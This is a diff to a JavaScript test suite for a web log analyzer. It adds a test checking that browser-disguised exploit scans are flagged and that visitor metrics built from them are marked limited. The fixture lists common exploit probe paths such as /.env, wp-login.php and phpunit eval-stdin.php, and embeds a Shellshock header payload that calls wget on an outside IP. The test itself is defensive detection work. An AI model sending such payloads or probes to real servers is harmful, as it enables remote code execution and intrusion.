@@ -461,6 +461,11 @@ function assertAnalysisReportSchema(report) {
   assert.ok(report.quality.recognitionRate >= 0 && report.quality.recognitionRate <= 1);
   assert.ok(["normal", "elevated"].includes(report.quality.cacheRisk));
   assert.strictEqual(typeof report.quality.chronologyIssue, "boolean");
+  assert.strictEqual(typeof report.quality.scanTrafficRisk, "boolean");
+  assert.strictEqual(Number.isFinite(report.scanRequests), true, "scanRequests");
+  assert.strictEqual(Number.isFinite(report.scanShare), true, "scanShare");
+  assert.ok(report.scanRequests >= 0);
+  assert.ok(report.scanShare >= 0 && report.scanShare <= 1);
   for (const key of claimKeys) {
     assert.ok(report.claims[key], `claims.${key}`);
     assert.ok(report.claimMatrix[key], `claimMatrix.${key}`);
@@ -514,6 +519,7 @@ function assertAnalysisReportSchema(report) {
   }
   assert.ok(Array.isArray(report.auditProtocol.requiredChecks));
   assert.ok(Array.isArray(report.auditProtocol.cannotSay));
+  assert.strictEqual(Number.isFinite(report.auditProtocol.dataBasis.scanRequests), true, "auditProtocol.dataBasis.scanRequests");
   assert.ok(["high", "medium", "limited"].includes(report.exportCompleteness.reliability));
   assert.ok(Array.isArray(report.exportCompleteness.reasons));
   assert.ok(Array.isArray(report.exportCompleteness.recommendedChecks));
@@ -1328,6 +1334,41 @@ test("behandelt Regex-Sonderzeichen in Conversion-Mustern als normale Zeichen", 
 test("erkennt verdaechtige Clients mit vielen Pageviews ohne Assets", () => {
   const result = analyze(fixture("suspicious-volume.log"));
   assert.strictEqual(result.suspiciousClients, 1);
+});
+
+test("browser-getarnte Exploit-Scans duerfen keine sicheren Besucher-Befunde erzeugen", () => {
+  const ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36";
+  const targets = [
+    "/wp-login.php",
+    "/xmlrpc.php",
+    "/wp-admin/theme-editor.php",
+    "/wp-content/themes/twentytwelve/archive.php",
+    "http://testp3.example.test/testproxy.php",
+    "/.env",
+    "/manager/html",
+    "/CFIDE/administrator/",
+    "/admin/i18n/readme.txt",
+    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "/panel.zip",
+    "/wp-admin/load-scripts.php?c=1&load[]=jquery-core"
+  ];
+  const lines = [];
+  for (let i = 0; i < targets.length * 2; i++) {
+    const target = targets[i % targets.length];
+    const stamp = combinedStampAt(i * 10);
+    const extra = i % 7 === 0 ? ' "() { :; }; /bin/bash -c wget http://198.51.100.9/x"' : "";
+    lines.push(combined("198.51.100.44", stamp, target, 200, ua, i % 5 === 0 ? "POST" : "GET", extra));
+  }
+  const result = buildResultFor(lines.join("\n"));
+  assert.ok(result.scanRequests >= 10);
+  assert.strictEqual(result.diagnostics.scanTrafficRisk, true);
+  assert.strictEqual(result.diagnostics.botReliability, "limited");
+  assert.strictEqual(result.claimMatrix.pageViews.status, "limited");
+  assert.strictEqual(result.claimMatrix.visits.status, "limited");
+  assert.strictEqual(result.decisionReadiness.pageViews.canUseForDecision, false);
+  assert.strictEqual(result.decisionReadiness.visits.canUseForDecision, false);
+  assert.match(result.evidenceFailures.pageViews.join(" "), /Exploit|Proxy-Scans|Admin/i);
+  assert.match(result.exportCompleteness.reasons.join(" "), /Exploit|Proxy-Scans|Admin/i);
 });
 
 test("filtert gemischte Hosts auf erlaubte Domains", () => {
